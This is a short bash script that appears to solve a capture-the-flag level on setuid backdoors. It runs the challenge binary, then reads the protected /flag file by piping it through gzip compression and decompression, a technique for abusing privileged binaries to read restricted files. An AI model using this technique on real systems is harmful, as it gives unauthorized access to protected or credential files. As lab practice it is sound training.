#!/bin/bash

/challenge/setuid-backdoor-level2.1
/usr/bin/gzip -c /flag | /usr/bin/gzip -d -
